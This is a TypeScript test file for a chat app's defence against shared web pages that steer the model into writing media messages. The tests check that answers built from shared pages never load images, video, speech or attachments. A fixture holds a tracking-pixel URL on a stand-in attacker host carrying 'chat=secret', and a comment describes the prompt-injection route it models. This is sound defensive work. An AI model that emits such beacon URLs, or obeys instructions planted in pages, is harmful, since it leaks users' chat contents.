import { describe, expect, it } from "vitest";

import { attachmentMessage, readAttachmentMessage } from "./chatAttachments";
import { buildImageMessage } from "./chatImage";
import {
  AUDIO_MESSAGE_PREFIX,
  IMAGE_PENDING_MARKER,
  SPEECH_MESSAGE_PREFIX,
  SPEECH_PENDING_MARKER,
  VIDEO_PENDING_MARKER,
} from "./chatMarkers";
import {
  extractMarkdownImage,
  readAudioMessage,
  readImageMessage,
  readSpeechMessage,
  readVideoMessage,
} from "./chatPanelMessages";
import { buildVideoMessage } from "./chatVideo";
import { answerImages, mediaContent, readSharedPages, sharedPagesLabel } from "./sharedPages";

describe("the server's mark on an answer built from shared pages", () => {
  it("is read with its sites", () => {
    expect(readSharedPages({ sites: ["docs.example.com", "intranet"] })).toEqual({ sites: ["docs.example.com", "intranet"] });
  });

  it("still counts when its sites are missing or unusable: the protection never hinges on them", () => {
    expect(readSharedPages({})).toEqual({ sites: [] });
    expect(readSharedPages({ sites: [42, "", "x".repeat(300), "ok.example"] })).toEqual({ sites: ["ok.example"] });
  });

  it("keeps at most twenty sites", () => {
    const sites = Array.from({ length: 25 }, (_, i) => `s${i}.example`);
    expect(readSharedPages({ sites })?.sites).toHaveLength(20);
  });

  it.each([undefined, null, "docs.example.com", 1, ["docs.example.com"]])("is absent for %j", (value) => {
    expect(readSharedPages(value)).toBeUndefined();
  });
});

describe("how the chat shows such an answer", () => {
  it("never loads its images", () => {
    expect(answerImages({ pageContext: { sites: ["docs.example.com"] } })).toBe("link");
    expect(answerImages({ pageContext: { sites: [] } })).toBe("link");
    expect(answerImages({})).toBe("load");
  });

  it.each([
    [[], "From a shared page"],
    [["docs.example.com"], "From a page on docs.example.com"],
    [["a.example", "b.example"], "From pages on a.example and b.example"],
    [["a.example", "b.example", "c.example"], "From pages on a.example and 2 other sites"],
  ])("labels %j as %s", (sites, label) => {
    expect(sharedPagesLabel({ sites })).toBe(label);
  });
});

describe("the chat's own media messages", () => {
  const marked = { sites: ["evil.example"] };
  const beacon = "https://evil.example/pixel.png?chat=secret";

  // Each is something a page could tell the model to write, and each would
  // make the chat load an address of the page's choosing.
  const cases: Array<[string, string, (content: string) => unknown]> = [
    ["a generated image", buildImageMessage({ url: beacon, prompt: "", model: "m" }), readImageMessage],
    ["a generated video", buildVideoMessage({ url: beacon, prompt: "", model: "m" }), readVideoMessage],
    ["generated speech", `${SPEECH_MESSAGE_PREFIX}${JSON.stringify({ url: beacon, prompt: "", model: "m" })}`, readSpeechMessage],
    [
      "an attachment",
      attachmentMessage({ userText: "", attachments: [{ kind: "image", name: "x.png", mime_type: "image/png", url: beacon }] }),
      readAttachmentMessage,
    ],
    ["a recording", `${AUDIO_MESSAGE_PREFIX}${JSON.stringify({ url: beacon, transcript: "" })}`, readAudioMessage],
    ["a markdown image on its own", `![x](${beacon})`, (content) => extractMarkdownImage(content).imageUrl],
  ];

  it.each(cases)("are read from an ordinary answer: %s", (_name, content, read) => {
    expect(read(mediaContent({ content }))).toBeTruthy();
  });

  it.each(cases)("are never read from an answer built from a shared page: %s", (_name, content, read) => {
    expect(read(mediaContent({ content, pageContext: marked }))).toBeFalsy();
    expect(read(mediaContent({ content, pageContext: { sites: [] } }))).toBeFalsy();
  });

  it.each([IMAGE_PENDING_MARKER, VIDEO_PENDING_MARKER, SPEECH_PENDING_MARKER])(
    "never show a shared page's answer as media still being made: %s",
    (marker) => {
      expect(mediaContent({ content: marker })).toBe(marker);
      expect(mediaContent({ content: marker, pageContext: marked })).toBe("");
    },
  );
});
